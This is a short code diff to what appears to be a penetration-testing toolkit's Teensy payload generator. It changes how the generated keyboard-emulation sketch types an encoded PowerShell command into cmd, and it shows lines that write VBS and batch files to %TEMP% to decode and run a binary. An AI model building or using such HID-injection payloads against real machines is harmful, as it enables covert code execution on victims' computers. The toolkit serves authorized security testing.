@@ -6,10 +6,6 @@ import subprocess
 
 import src.core.setcore as core
 
-# from src.core.setcore import *
-# from src.core.dictionaries import *
-# from src.core.menu.text import *
-
 ##########################################################################
 #
 #                            BSIDES LV SDCARD to Teensy Creator
@@ -174,7 +170,7 @@ void setup()
   // run through cmd
   CommandAtRunBar("cmd");
   delay(1000);
-  Keyboard.println("powershell -e {powershell_command}");
+  Keyboard.println("{encodedcommand} {powershell_command}");
   // Tweak this delay.  Larger files take longer to decode through powershell.
   delay(10000);
   Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %TEMP%\\\\{vbs}");
@@ -232,7 +228,7 @@ Keyboard.send_now();
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }}
-""".format(random_filename=random_filename, powershell_command=powershell_command, vbs=vbs, bat=bat))
+""".format(random_filename=random_filename, encodedcommand=core.powershell_encodedcommand() ,powershell_command=powershell_command, vbs=vbs, bat=bat))
 # delete temporary file
 subprocess.Popen("rm {0} 1> /dev/null 2>/dev/null".format(random_filename), shell=True).wait()
 print("[*] Binary to Teensy file exported as teensy.ino")
